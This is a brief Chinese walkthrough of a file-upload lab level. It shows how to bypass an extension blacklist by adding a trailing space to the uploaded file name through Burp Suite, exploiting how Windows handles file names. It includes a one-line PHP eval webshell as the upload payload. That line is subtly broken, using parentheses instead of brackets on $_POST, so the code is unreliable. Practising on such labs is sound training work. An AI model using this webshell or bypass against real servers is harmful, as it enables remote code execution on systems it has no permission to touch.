## 解题wp(By:独立团孙德胜Alan)
本pass可以通过增加空格的方式绕过，注意，此Pass需要修改PHP环境为5.2.17

## 1.打开第六关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

#### 提示不允许上传

## 3.分析代码

![](./img/3.png)

#### $file_ext = trim($file_ext); //首尾去空

#### 抓包增加空格。window和linux系统文件名后缀都会自动过滤空格

## 4.我们可以使用Burpsutie抓包，利用windows系统特性绕过

![](/img/4.png)
